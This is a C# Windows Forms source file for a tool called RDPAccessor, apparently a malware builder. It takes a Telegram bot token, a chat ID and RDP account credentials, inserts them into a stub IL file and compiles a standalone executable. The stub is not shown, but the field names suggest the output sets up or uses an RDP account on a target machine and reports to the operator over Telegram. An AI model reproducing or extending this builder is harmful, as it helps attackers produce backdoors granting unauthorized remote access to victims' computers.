using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RDPAccessor
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            this.Capture = false;
            var msg = Message.Create(this.Handle, 0xa1, new IntPtr(2), IntPtr.Zero);
            this.WndProc(ref msg);
        }

        private void closeBtn_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void minimazeBtn_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private async void buildBtn_Click(object sender, EventArgs e)
        {
            string tokenBot = botTokenBox.Text,
                   chatId = chatidBox.Text,
                   username = accUsernameBox.Text,
                   password = accPasswdBox.Text;

            if (string.IsNullOrEmpty(tokenBot) || string.IsNullOrEmpty(chatId) || string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
            {
                SetStatusLabel("Error - forms cannot be empty!", Color.Red);
            }
            else
            {
                string stubPath = "stub",
                       stubName = "stub.il",
                       ilasmPath = "compilator\\ilasm.exe",
                       stubFilePath = Path.Combine(stubPath, stubName);

                if (Directory.Exists(stubPath) && File.Exists(stubFilePath))
                {
                    string ilCode = File.ReadAllText(stubFilePath);
                    ilCode = ReplaceTokens(ilCode, tokenBot, chatId, username, password);

                    string tempFilePath = Path.Combine(stubPath, "stubtemp.il");
                    File.WriteAllText(tempFilePath, ilCode, Encoding.UTF8);

                    SaveFileDialog saveFileDialog = new SaveFileDialog();
                    saveFileDialog.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*";
                    saveFileDialog.Title = "Save the built executable file";

                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        string exeOutputPath = saveFileDialog.FileName;

                        if (File.Exists(ilasmPath))
                        {
                            CompileIlCode(ilasmPath, tempFilePath, exeOutputPath);
                        }
                        else
                        {
                            SetStatusLabel("Error - ilasm.exe not found", Color.Red);
                        }
                    }
                    else
                    {
                        SetStatusLabel("Build Canceled", Color.Red);
                    }

                    File.Delete(tempFilePath);
                }
                else
                {
                    SetStatusLabel("Error - Not found required files and folders!", Color.Red);
                }
            }
        }

        private void SetStatusLabel(string text, Color color)
        {
            statusLabel.ForeColor = color;
            statusLabel.Text = "Status: " + text;
            Task.Delay(3000).Wait();
            statusLabel.ForeColor = Color.Black;
            statusLabel.Text = "Status: Idle";
            ClearTextBoxes();
        }

        private void ClearTextBoxes()
        {
            botTokenBox.Clear();
            chatidBox.Clear();
            accUsernameBox.Clear();
            accPasswdBox.Clear();
        }

        private string ReplaceTokens(string ilCode, string tokenBot, string chatId, string username, string password)
        {
            return ilCode
                .Replace("TOKENBOT", tokenBot)
                .Replace("CHATIDUSER", chatId)
                .Replace("RDPUSERNAME", username)
                .Replace("RDPPASSWORD", password);
        }

        private void CompileIlCode(string ilasmPath, string tempFilePath, string exeOutputPath)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = ilasmPath;
            process.StartInfo.Arguments = $"\"{tempFilePath}\" /output=\"{exeOutputPath}\"";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            process.WaitForExit();

            if (File.Exists(exeOutputPath))
            {
                SetStatusLabel("Build Successful", Color.Black);
                Process.Start("explorer.exe", $"/select,\"{exeOutputPath}\"");
            }
            else
            {
                SetStatusLabel("Error - Compilation failed", Color.Red);
            }
        }
    }
}
